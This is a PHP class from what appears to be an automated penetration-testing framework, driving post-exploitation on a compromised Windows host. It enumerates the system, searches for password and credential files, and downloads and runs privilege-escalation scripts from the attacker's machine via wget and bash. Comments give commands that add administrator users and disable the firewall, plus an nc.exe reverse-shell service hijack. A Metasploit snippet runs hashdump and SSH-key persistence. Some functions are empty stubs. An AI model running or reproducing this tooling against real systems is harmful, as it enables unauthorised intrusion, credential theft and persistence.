<?php



class lan4win extends LAN{
    
    /*
https://www.exploit-db.com/docs/english/18229-white-paper--post-exploitation-using-meterpreter.pdf
https://www.hackingarticles.in/hacking-with-empire-powershell-post-exploitation-agent/
https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-windows
http://pentestit.com/ibombshell-dynamic-post-exploitation-remote-shell/
https://awansec.com/windows-priv-esc.html
http://0xc0ffee.io/blog/OSCP-Goldmine
https://ptestmethod.readthedocs.io/en/latest/LFF-IPS-P3-Exploitation.html#remote-code-execution-methods
https://ired.team/offensive-security-experiments/offensive-security-cheetsheets
https://github.com/OlivierLaflamme/Cheatsheet-God/blob/master/Cheatsheet_LocalSamDump.txt
https://www.axcelsec.com/2018/05/offensive-security-testing-guide.html
https://www.offensive-security.com/metasploit-unleashed/mimikatz/
https://github.com/ferreirasc/oscp/tree/master/priv_escalation/Windows


esktop Users” group, then just log in via remote desktop.

Add a user on windows:

net user $username $password /add

Add a user to the “Remote Desktop Users” group:

net localgroup "Remote Desktop Users" $username /add

Make a user an administrator:

net localgroup administrators $username /add

Disable Windows firewall on newer versions:

NetSh Advfirewall set allprofiles state off

Disable windows firewall on older windows:

netsh firewall set opmode disable

Disable Windows firewall on newer versions:

NetSh Advfirewall set allprofiles state off

Disable windows firewall on older windows:

netsh firewall set opmode disable

https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
https://bitvijays.github.io/LFC-VulnerableMachines.html





     */
public function __construct($ip,$port,$protocol,$stream,$service) {
    parent::__construct($ip,$port,$protocol,$stream,$service);
    $service = trim($service);
    $sql_r = "SELECT ip,port,protocol,templateB64_id FROM LAN WHERE id8port = '$this->port2id' AND templateB64_id = '$service' ORDER BY ladate DESC LIMIT 1 ";
    if (!$this->checkBD($sql_r)) {
        $sql_w = "INSERT  INTO LAN (ip,port,protocol,templateB64_id) VALUES ('$this->ip','$this->port','$this->protocol','$service'); ";
        $this->mysql_ressource->query($sql_w);
        //$this->cmd("localhost","echo '$this->root_passwd' | sudo -S tshark -i $this->eth_wlan  host $this->ip -w $this->dir_tmp/$this->ip.pcap");
        echo $this->rouge("Working on LAN for the first time");
    }
}



public function lan4pentest(){
    $result = "";
    $result .= $this->titre(__FUNCTION__);
    $result .= $this->lan2id();
    $result .= $this->lan2netstat();

    $result .= $this->lan2history();
    $result .= $this->lan2hostname();


    $result .= $this->lan2env(); 
    
    $result .= $this->lan2info();
    
    $result .= $this->lan2log();

    
    $result .= $this->lan2os4kernel();
     
    $result .= $this->lan2persistance();
    $result .= $this->lan2lsof();
    $result .= $this->lan2priv();
    $result .= $this->lan2ps();
    $result .= $this->lan2pwd();
    $result .= $this->lan2webrowser();
    

    $result .= $this->lan2bins();
    $result .= $this->lan2dns();
    $result .= $this->lan2interfaces();
    $result .= $this->lan2hw();

    $result .= $this->lan2os4version(); 
    $result .= $this->lan2tools(); 

    
    $result .= $this->lan2exit();
    return  $result ;
}

public function lan2info(){
    $result = "";
    $result .= $this->ssTitre(__FUNCTION__);
    $sql_r_1 = "SELECT ".__FUNCTION__." FROM LAN WHERE id8port = '$this->port2id' AND ".__FUNCTION__." IS NOT NULL";
    if ($this->checkBD($sql_r_1) ) return base64_decode($this->req2BD4out(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'"));
    else {

        $data = "arp -a";
        $lines = $this->lan2stream4result($data);
        $result .= $lines;
        $data = "systeminfo";
        $lines = $this->lan2stream4result($data);
        $result .= $lines;
        $data = "php -r 'phpinfo();' ";
        $lines = $this->lan2stream4result($data);
        $result .= $lines;

        
        $result = base64_encode($result);return base64_decode($this->req2BD4in(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'",$result));
    }
}


public function lan2tools(){
    /*
https://github.com/SecWiki/windows-kernel-exploits
https://github.com/GDSSecurity/Windows-Exploit-Suggester
     */
    $result = "";
    $result .= $this->ssTitre(__FUNCTION__);
    $sql_r_1 = "SELECT ".__FUNCTION__." FROM LAN WHERE id8port = '$this->port2id' AND ".__FUNCTION__." IS NOT NULL";
    if ($this->checkBD($sql_r_1) ) return base64_decode($this->req2BD4out(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'"));
    else {
        $attacker_ip = $this->ip4addr4target($this->ip);
        $this->tcp2open4server($attacker_ip, $this->port_rfi);
        
        if (!file_exists("$this->dir_tmp/LinEnum.sh")) $this->requette("cp -v $this->dir_tools/enum/linux/LinEnum.sh $this->dir_tmp/LinEnum.sh ");
        if (!file_exists("$this->dir_tmp/unix-privesc-check.sh")) $this->requette("cp -v $this->dir_tools/enum/linux/unix-privesc-check.sh $this->dir_tmp/unix-privesc-check.sh ");
        
        $data = "wget http://".$this->ip4addr4target($this->ip).":$port_rev/LinEnum.sh -O ./LinEnum.sh && bash ./LinEnum.sh -t > ./LinEnum.rst && cat ./LinEnum.rst | strings && rm -v ./LinEnum.sh ./LinEnum.rst";
        $lines = $this->lan2stream4result($data);
        $result .= $lines;
        sleep(10);
        $data = "wget http://".$this->ip4addr4target($this->ip).":$port_rev/unix-privesc-check.sh -O  ./unix-privesc-check.sh && bash ./unix-privesc-check.sh standard  > ./unix-privesc-check.rst && cat ./unix-privesc-check.rst | strings && rm -v ./unix-privesc-check.sh ./unix-privesc-check.rst";
        $lines = $this->lan2stream4result($data);
        $result .= $lines;
        
        
        $result = base64_encode($result);return base64_decode($this->req2BD4in(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'",$result));
    }
}

public function lan2bins(){
    $result = "";
    $result .= $this->ssTitre(__FUNCTION__);
    $sql_r_1 = "SELECT ".__FUNCTION__." FROM LAN WHERE id8port = '$this->port2id' AND ".__FUNCTION__." IS NOT NULL";
    if ($this->checkBD($sql_r_1) ) return base64_decode($this->req2BD4out(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'"));
    else {
        $data = "";
        $result .= $this->cmd("$this->ip", $data);
        $lines = $this->lan2stream4result($data);
        $result .= $lines;
        $result = base64_encode($result);return base64_decode($this->req2BD4in(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'",$result));
    }
}

public function lan2webrowser(){
    $result = "";
    $result .= $this->ssTitre(__FUNCTION__);
    $sql_r_1 = "SELECT ".__FUNCTION__." FROM LAN WHERE id8port = '$this->port2id' AND ".__FUNCTION__." IS NOT NULL";
    if ($this->checkBD($sql_r_1) ) return base64_decode($this->req2BD4out(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'"));
    else {
        $data = "";
        $lines = $this->lan2stream4result($data);
        $result .= $lines;
        $result = base64_encode($result);return base64_decode($this->req2BD4in(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'",$result));
    }
}

public function lan2hostname(){
    $result = "";
    $result .= $this->ssTitre(__FUNCTION__);
    $sql_r_1 = "SELECT ".__FUNCTION__." FROM LAN WHERE id8port = '$this->port2id' AND ".__FUNCTION__." IS NOT NULL";
    if ($this->checkBD($sql_r_1) ) return base64_decode($this->req2BD4out(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'"));
    else {
        $data = "echo %hostname%";
        $lines = $this->lan2stream4result($data);
        $result .= $lines;
        $result = base64_encode($result);return base64_decode($this->req2BD4in(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'",$result));
    }
}

public function lan2ps(){
    $result = "";
    $result .= $this->ssTitre(__FUNCTION__);
    $sql_r_1 = "SELECT ".__FUNCTION__." FROM LAN WHERE id8port = '$this->port2id' AND ".__FUNCTION__." IS NOT NULL";
    if ($this->checkBD($sql_r_1) ) return base64_decode($this->req2BD4out(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'"));
    else {
        $data = "schtasks /query /fo LIST /v && tasklist /SVC && net start && DRIVERQUERY &&
for /f 'delims=' %%A in ('dir /s /b %WINDIR%\system32\*htable.xsl') do set 'var=%%A'
wmic process get CSName,Description,ExecutablePath,ProcessId /format:'%var%' &&
wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:'%var%' &&
wmic USERACCOUNT list full /format:'%var%' &&
wmic group list full /format:'%var%' &&
wmic nicconfig where IPEnabled='true' get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /format:'%var%' &&
wmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /format:'%var%' &&
wmic netuse list full /format:'%var%' &&
wmic qfe get Caption,Description,HotFixID,InstalledOn /format:'%var%' &&
wmic startup get Caption,Command,Location,User /format:'%var%' &&
wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:'%var%' &&
wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /format:'%var%' &&
wmic Timezone get DaylightName,Description,StandardName /format:'%var%' &&
";
        $result .= $this->cmd("$this->ip", $data);
        $lines = $this->lan2stream4result($data);
        $result .= $lines;
        $result = base64_encode($result);return base64_decode($this->req2BD4in(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'",$result));
    }
}

public function lan2pwd(){
    $result = "";
    $result .= $this->ssTitre(__FUNCTION__);
    $sql_r_1 = "SELECT ".__FUNCTION__." FROM LAN WHERE id8port = '$this->port2id' AND ".__FUNCTION__." IS NOT NULL";
    if ($this->checkBD($sql_r_1) ) return base64_decode($this->req2BD4out(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'"));
    else {
        $data = "dir";
        $result .= $this->cmd("$this->ip", $data);
        $lines = $this->lan2stream4result($data);
        $result .= $lines;
        $result = base64_encode($result);return base64_decode($this->req2BD4in(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'",$result));
    }
}


public function lan2lsof(){
    $result = "";
    $result .= $this->ssTitre(__FUNCTION__);
    $sql_r_1 = "SELECT ".__FUNCTION__." FROM LAN WHERE id8port = '$this->port2id' AND ".__FUNCTION__." IS NOT NULL";
    if ($this->checkBD($sql_r_1) ) return base64_decode($this->req2BD4out(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'"));
    else {
        $data = "";
        $result .= $this->cmd("$this->ip", $data);
        $lines = $this->lan2stream4result($data);
        $result .= $lines;
        $result = base64_encode($result);return base64_decode($this->req2BD4in(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'",$result));
    }
}


public function lan2netstat(){
    $result = "";
    $result .= $this->ssTitre(__FUNCTION__);
    $sql_r_1 = "SELECT ".__FUNCTION__." FROM LAN WHERE id8port = '$this->port2id' AND ".__FUNCTION__." IS NOT NULL";
    if ($this->checkBD($sql_r_1) ) return base64_decode($this->req2BD4out(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'"));
    else {
        $data = "netstat -ano";
        $result .= $this->cmd("$this->ip", $data);
        $lines = $this->lan2stream4result($data);
        $result .= $lines;
        
        $result = base64_encode($result);return base64_decode($this->req2BD4in(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'",$result));
    }
}


public function lan2os4version(){
    $result = "";
    $result .= $this->ssTitre(__FUNCTION__);
    $sql_r_1 = "SELECT ".__FUNCTION__." FROM LAN WHERE id8port = '$this->port2id' AND ".__FUNCTION__." IS NOT NULL";
    if ($this->checkBD($sql_r_1) ) return base64_decode($this->req2BD4out(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'"));
    else {
        $data = "systeminfo | findstr /B /C:'OS Version' ";
        $result .= $this->cmd("$this->ip", $data);
        $lines = $this->lan2stream4result($data);
        $result .= $lines;
        $result = base64_encode($result);return base64_decode($this->req2BD4in(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'",$result));
    }
}


public function lan2dns(){
    $result = "";
    $result .= $this->ssTitre(__FUNCTION__);
    $sql_r_1 = "SELECT ".__FUNCTION__." FROM LAN WHERE id8port = '$this->port2id' AND ".__FUNCTION__." IS NOT NULL";
    if ($this->checkBD($sql_r_1) ) return base64_decode($this->req2BD4out(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'"));
    else {
        $data = "";
        $result .= $this->cmd("$this->ip", $data);
        $lines = $this->lan2stream4result($data);
        $result .= $lines;
        $result = base64_encode($result);return base64_decode($this->req2BD4in(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'",$result));
    }
}



public function lan2interfaces(){
    $result = "";
    $result .= $this->ssTitre(__FUNCTION__);
    $sql_r_1 = "SELECT ".__FUNCTION__." FROM LAN WHERE id8port = '$this->port2id' AND ".__FUNCTION__." IS NOT NULL";
    if ($this->checkBD($sql_r_1) ) return base64_decode($this->req2BD4out(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'"));
    else {
         $data = "ipconfig /all ";
        $result .= $this->cmd("$this->ip", $data);
        $lines = $this->lan2stream4result($data);
        $result .= $lines;
        $data = "route print";
        $result .= $this->cmd("$this->ip", $data);
        $lines = $this->lan2stream4result($data);
        $result .= $lines;
        $data = "netsh firewall show state ";
        $result .= $this->cmd("$this->ip", $data);
        $lines = $this->lan2stream4result($data);
        $result .= $lines;
        $data = "netsh firewall show config";
        $result .= $this->cmd("$this->ip", $data);
        $lines = $this->lan2stream4result($data);
        $result .= $lines;
        $result = base64_encode($result);return base64_decode($this->req2BD4in(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'",$result));
    }
}


public function lan2hw(){
    $result = "";
    $result .= $this->ssTitre(__FUNCTION__);
    $sql_r_1 = "SELECT ".__FUNCTION__." FROM LAN WHERE id8port = '$this->port2id' AND ".__FUNCTION__." IS NOT NULL";
    if ($this->checkBD($sql_r_1) ) return base64_decode($this->req2BD4out(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'"));
    else {
        $data = " ";
        $result .= $this->cmd("$this->ip", $data);
        $lines = $this->lan2stream4result($data);
        $result .= $lines;
        $data = "";
        $result .= $this->cmd("$this->ip", $data);
        $lines = $this->lan2stream4result($data);
        $result .= $lines;
        $data = "";
        $result .= $this->cmd("$this->ip", $data);
        $lines = $this->lan2stream4result($data);
        $result .= $lines;
        $data = "";
        $result .= $this->cmd("$this->ip", $data);
        $lines = $this->lan2stream4result($data);
        $result .= $lines;

        $result = base64_encode($result);return base64_decode($this->req2BD4in(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'",$result));
    }
}


public function lan2log(){
    /*
    C:\Windows\WindowUpdate.log
    wmic qfe
     */
    $result = "";
    $result .= $this->ssTitre(__FUNCTION__);
    $sql_r_1 = "SELECT ".__FUNCTION__." FROM LAN WHERE id8port = '$this->port2id' AND ".__FUNCTION__." IS NOT NULL";
    if ($this->checkBD($sql_r_1) ) return base64_decode($this->req2BD4out(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'"));
    else {
        $data = "dir /s *pass* == *cred* == *vnc* == *.config*";
        $result .= $this->cmd("$this->ip", $data);
        $lines = $this->lan2stream4result($data);
        $result .= $lines;

        
        $result = base64_encode($result);return base64_decode($this->req2BD4in(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'",$result));
    }
}


public function lan2env(){
    $result = "";
    $result .= $this->ssTitre(__FUNCTION__);
    $sql_r_1 = "SELECT ".__FUNCTION__." FROM LAN WHERE id8port = '$this->port2id' AND ".__FUNCTION__." IS NOT NULL";
    if ($this->checkBD($sql_r_1) ) return base64_decode($this->req2BD4out(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'"));
    else {
        $data = "echo %PATH%";
        $result .= $this->cmd("$this->ip", $data);
        $lines = $this->lan2stream4result($data);
        $result .= $lines;
        $result = base64_encode($result);return base64_decode($this->req2BD4in(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'",$result));
    }
}

public function lan2exit(){
    $result = "";
    $result .= $this->ssTitre(__FUNCTION__);

        $data = "exit";
        $result .= $this->cmd("$this->ip", $data);
        $this->lan2stream4result($data);
        fclose($this->stream);
        return $result;
}

public function lan2msf(){
    $this->ssTitre(__FUNCTION__);
    $query = "echo \"db_status\nsearch $cve\nexit\n \" > $this->dir_tmp/".__FUNCTION__.".search.rc";
    $this->requette($query);
    $query = "msfconsole -q -r $this->dir_tmp/".__FUNCTION__.".search.rc -y /usr/share/metasploit-framework/config/database.yml  " ;
    return $this->req_ret_str($query);
    
    // set AutoRunScript multiconsolecommand -cl \"getsystem\",\"getuid\"
    // set AutoRunScript multi_console_command -rc $this->dir_tmp/$kio1_service_smb->ip.$kio1_service_smb->port.post_linux.rc
    // set AutoRunScript post/linux/gather/enum_system
    $query = "echo \"run post/linux/gather/enum_users_history\nrun post/linux/gather/enum_system\nrun post/linux/gather/enum_configs\nrun post/linux/gather/enum_network\nrun post/linux/gather/enum_protections\nrun post/linux/gather/hashdump\nrun post/linux/manage/sshkey_persistence\" > $this->dir_tmp/$kio1_service_smb->ip.$kio1_service_smb->port.post_linux.rc";
    //$this->requette($query);
    
    
}


public function lan2priv(){
    /*
     https://github.com/rasta-mouse/Sherlock
     https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
     cmdkey /list
     
     
     
     */
    $result = "";
    $result .= $this->ssTitre(__FUNCTION__);
    $sql_r_1 = "SELECT ".__FUNCTION__." FROM LAN WHERE id8port = '$this->port2id' AND ".__FUNCTION__." IS NOT NULL";
    if ($this->checkBD($sql_r_1) ) return base64_decode($this->req2BD4out(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'"));
    else {
        $data = "";
        $result .= $this->cmd("$this->ip", $data);
        $lines = $this->lan2stream4result($data);
        $result .= $lines;

        
        $result = base64_encode($result);return base64_decode($this->req2BD4in(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'",$result));
    }
}


public function lan2persistance(){
    $result = "";
    $result .= $this->ssTitre(__FUNCTION__);
    $sql_r_1 = "SELECT ".__FUNCTION__." FROM LAN WHERE id8port = '$this->port2id' AND ".__FUNCTION__." IS NOT NULL";
    if ($this->checkBD($sql_r_1) ) return base64_decode($this->req2BD4out(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'"));
    else {
        // "sc qc upnphost && sc config upnphost binpath= '$this->vm_tmp_win\\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe' && sc config upnphost obj= '.\LocalSystem' password= '' && sc qc upnphost && net start upnphost "
        $data = "";
        $result .= $this->cmd("$this->ip", $data);
        $lines = $this->lan2stream4result($data);
        $result .= $lines;

        $result = base64_encode($result);return base64_decode($this->req2BD4in(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'",$result));
    }
}


public function lan2history(){
    $result = "";
    $result .= $this->ssTitre(__FUNCTION__);
    $sql_r_1 = "SELECT ".__FUNCTION__." FROM LAN WHERE id8port = '$this->port2id' AND ".__FUNCTION__." IS NOT NULL";
    if ($this->checkBD($sql_r_1) ) return base64_decode($this->req2BD4out(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'"));
    else {
        $data = "";
        $result .= $this->cmd("$this->ip", $data);
        $lines = $this->lan2stream4result($data);
        $result .= $lines;
        $result = base64_encode($result);return base64_decode($this->req2BD4in(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'",$result));
    }
}



public function lan2id(){
    $result = "";
    $result .= $this->ssTitre(__FUNCTION__);
    $sql_r_1 = "SELECT ".__FUNCTION__." FROM LAN WHERE id8port = '$this->port2id' AND ".__FUNCTION__." IS NOT NULL";
    if ($this->checkBD($sql_r_1) ) return base64_decode($this->req2BD4out(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'"));
    else {
    $data = "echo %username% && net user %username%";
    $result .= $this->cmd("$this->ip", $data);
    $lines = $this->lan2stream4result($data);
    $result .= $lines;
    $result = base64_encode($result);return base64_decode($this->req2BD4in(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'",$result));
    }
}


public function lan2os4kernel(){
    $result = "";
    $result .= $this->ssTitre(__FUNCTION__);
    $sql_r_1 = "SELECT ".__FUNCTION__." FROM LAN WHERE id8port = '$this->port2id' AND ".__FUNCTION__." IS NOT NULL";
    if ($this->checkBD($sql_r_1) ) return base64_decode($this->req2BD4out(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'"));
    else {
        $data = "systeminfo | findstr /B /C:'OS Name' ";
        $result .= $this->cmd("$this->ip", $data);
        $lines = $this->lan2stream4result($data);
        $result .= $lines;
        $result = base64_encode($result);return base64_decode($this->req2BD4in(__FUNCTION__,"LAN","ip = '$this->ip' AND port = '$this->port' AND protocol = '$this->protocol'",$result));
    }
}




public function for4win_Dyn4invest_pid($host, $pid) {
    $this->ssTitre("View Running Processes");
    $this->for4win_Dyn4invest_cmd($host, "top");
    
    $this->ssTitre("To Send Processes Signals by PID");
    $this->for4win_Dyn4invest_cmd($host,"sudo ps -f --pid $pid");
    $this->for4win_Dyn4invest_cmd($host,"sudo pidstat -p $pid");
    $this->for4win_Dyn4invest_cmd($host,"sudo ps -f --forest --pid $pid");
    $this->for4win_Dyn4invest_cmd($host,"sudo pstree -p $pid");
    $this->for4win_Dyn4invest_cmd($host,"sudo pcat -v $pid");
    $this->for4win_Dyn4invest_cmd($host, "sudo pmap -d $pid");
    $this->for4win_Dyn4invest_cmd($host, "sudo lsof -p $pid");
    $this->for4win_Dyn4invest_cmd($host, "cat /proc/$pid/cmdline ");
    $this->for4win_Dyn4invest_cmd($host, "ls /proc/$pid ");
    
    $this->for4win_Dyn4invest_cmd($host, "gdb --batch -q -p $pid -ex \"info proc stat\" ");
    $this->for4win_Dyn4invest_cmd($host, "gdb --batch -q -p $pid -ex \"info proc status\" ");
    $this->for4win_Dyn4invest_cmd($host, "gdb --batch -q -p $pid -ex \"info variables\" ");
    $this->for4win_Dyn4invest_cmd($host, "gdb --batch -q -p $pid -ex \"info args\" ");
    $this->for4win_Dyn4invest_cmd($host, "gdb --batch -q -p $pid -ex \"info proc mappings\" ");
    $this->for4win_Dyn4invest_cmd($host, "gdb --batch -q -p $pid -ex \"maintenance info sections\" ");
    $this->for4win_Dyn4invest_cmd($host, "gdb --batch -q -p $pid -ex \"info sharedlibrary\" ");
    $this->for4win_Dyn4invest_cmd($host, "gdb --batch -q -p $pid -ex \"info files\" ");
    $this->for4win_Dyn4invest_cmd($host, "gdb --batch -q -p $pid -ex \"info functions\" ");
    $this->ssTitre("libraries trace");
    $this->for4win_Dyn4invest_cmd($host, "sudo ltrace -p $pid");
    $this->ssTitre("syscall trace");
    $this->for4win_Dyn4invest_cmd($host, "sudo strace -p $pid");
    $this->ssTitre("heap - malloc trace");
    $this->for4win_Dyn4invest_cmd($host, "sudo mtrace -p $pid");
    
    $this->for4win_Dyn4invest_cmd($host, "sudo dtrace -p $pid");
    
    $this->ssTitre("To Send Processes Signals by Name");
    $this->for4win_Dyn4invest_cmd($host,"sudo pkill -9 ping");
}
public function for4win_Dyn4invest_user($host) {
    $this->for4win_Dyn4invest_cmd($host, "id");
    $this->for4win_Dyn4invest_cmd($host, "whoami");
    $this->for4win_Dyn4invest_cmd($host, "who");
}
public function for4win_Dyn4invest_preload_library($host, $cmd) {
    $this->for4win_Dyn4invest_cmd($host, "$this->dir_tmp/preloadcheck $cmd");
    $this->for4win_Dyn4invest_cmd($host, "gdb --batch -q -ex \"b dlsym\" -ex \"bt\" -ex \"run\" $cmd");
}
public function for4win_Dyn4invest_module($host, $module_name) {
    $this->ssTitre("Investigation Module By Name");
    //$this->for4win_Dyn4invest_cmd($host, "sudo lsmod | grep '$module_name' ");
}
public function for4win_Dyn4invest_port($host, $port) {
    $this->ssTitre("Investigation Connection Via Port Number");
    $this->for4win_Dyn4invest_cmd($host, "netstat -abn | grep ':$port' ");
}

public function for4win_Dyn4invest_process($host, $port) {
    $this->ssTitre("Process Monitor | Hacker - Sysinternal");
    $this->for4win_Dyn4invest_cmd($host, "procmon.exe ");
    $this->ssTitre("Process Explorer - Sysinternal");
    $this->for4win_Dyn4invest_cmd($host, "procexp.exe ");
    $this->for4win_Dyn4invest_cmd($host, "tasklist ");
    $this->ssTitre("Process Suite - Sysinternal");
    $this->for4win_Dyn4invest_cmd($host, "PsServices.exe > $this->vm_tmp_win\\PsService.first ");
    $this->for4win_Dyn4invest_cmd($host, "PSPAD.exe -> tools -> diff 2 text -> $this->vm_tmp_win\\PsService.last  ");
    
}

public function for4win_Dyn4invest_dll($host, $port) {
    $this->ssTitre("Win DLL - Sysinternal");
    $this->for4win_Dyn4invest_cmd($host, "Winobj.exe ");
    $this->for4win_Dyn4invest_cmd($host, "regedit.exe HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSer\Control\Session Manager\KnownDLLs");
}
public function for4win_Dyn4invest_api($host, $port) {
    $this->ssTitre("Win API");
    $this->for4win_Dyn4invest_cmd($host, "WinApiOverride.exe ");
}

public function for4win_Dyn4invest_connection($host) {
    // Tcptrack – used for session data information which can prove useful for attack correlation.
    $this->ssTitre("Investigation Connection Via Port Number");
    $this->for4win_Dyn4invest_cmd($host, "netstat -abn  ");
    $this->for4win_Dyn4invest_cmd($host, "TCPview  ");
}

public function for4win_Dyn4invest_registre($host) {
    // Tcptrack – used for session data information which can prove useful for attack correlation.
    // eventvwr.msc | Windows launch event viewer via CLI
    $this->ssTitre("Process Filesystem and registery");
    $this->article("Windows Starts", "Run and RunOnce registry keys cause programs to run each time that a user logs on. The data value for a key is a command line no longer than 260 characters. Register programs to run by adding entries of the form description-string=commandline. You can write multiple entries under a key. If more than one program is registered under any particular key, the order in which those programs run is indeterminate.
        
The Windows registry includes the following four keys:
        
    HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
	HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
        
    HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
	HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
  		");
    $this->for4win_Dyn4invest_cmd($host, "CaptureBat.exe > $this->vm_tmp_win\\$this->file_name.CaptureBat.txt  ");
    $this->for4win_Dyn4invest_cmd($host, "regShot.exe ");
    $this->for4win_Dyn4invest_cmd($host, "autoruns.exe -> look persistence ");
    $this->for4win_Dyn4invest_cmd($host, "reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run");
    $this->for4win_Dyn4invest_cmd($host, "reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run");
    $this->for4win_Dyn4invest_cmd($host, "reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce");
    $this->for4win_Dyn4invest_cmd($host, "reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce");
    $this->for4win_Dyn4invest_cmd($host, "");
    $this->for4win_Dyn4invest_cmd($host, "");
    $this->for4win_Dyn4invest_cmd($host, "");
    $this->for4win_Dyn4invest_cmd($host, "");
    $this->for4win_Dyn4invest_cmd($host, "");
}

public function for4win_Dyn4invest_cmd($host, $cmd) {
    if (strtolower($host) == "localhost") $this->requette($cmd);
    else $this->cmd($host, $cmd);
}


public function for4win_Dyn4invest_file($host) {
    $this->ssTitre("File Hash and More - CFF Explorer ");
    $this->for4win_Dyn4invest_cmd($host, "ExplorerSuite.exe  ");
    $this->for4win_Dyn4invest_cmd($host, "trID.exe  ");
    $this->for4win_Dyn4invest_cmd($host, "PeId.exe  ");
    $this->ssTitre("to see newly created mutex - handle.exe - SysinternalSuite ");
    $this->for4win_Dyn4invest_cmd($host, "handle.exe -a > $this->vm_tmp_win\\Before.txt ");
    $this->for4win_Dyn4invest_cmd($host, "handle.exe -a > $this->vm_tmp_win\\After.txt  ");
    $this->for4win_Dyn4invest_cmd($host, "PSPAD.exe -> tools -> diff 2 text -> $this->vm_tmp_win\\PsService.last  ");
    
}

public function for4win_Dyn4invest_hook($host) {
    $this->ssTitre("Search Hooking - Rohitab API Monitor");
    // netsh firewall show config
    $this->for4win_Dyn4invest_cmd($host, "api-monitor-v2r13-setup-x86.exe -> search SetWindowsHookEx  ");
    
}

public function for4win_Dyn4invest_file_integrity($host, $remarque) {
    if (! empty($remarque))
        $this->remarque($remarque);
        $this->ssTitre("Tripwire");
        $this->cmd($host, " tripwire --check --interactive | tee $this->dir_tmp/scan_antirootkit.tripwire ");
        $this->ssTitre("OSSEC");
        $this->cmd($host, " /var/ossec/bin/ossec-control status");
        $this->cmd($host, " /var/ossec/bin/ossec-control start");
        $this->cmd($host, " tail -f /var/ossec/logs/alerts/alerts.log");
        $this->cmd($host, " tail -f /var/ossec/logs/ossec.log");
}




}
?>
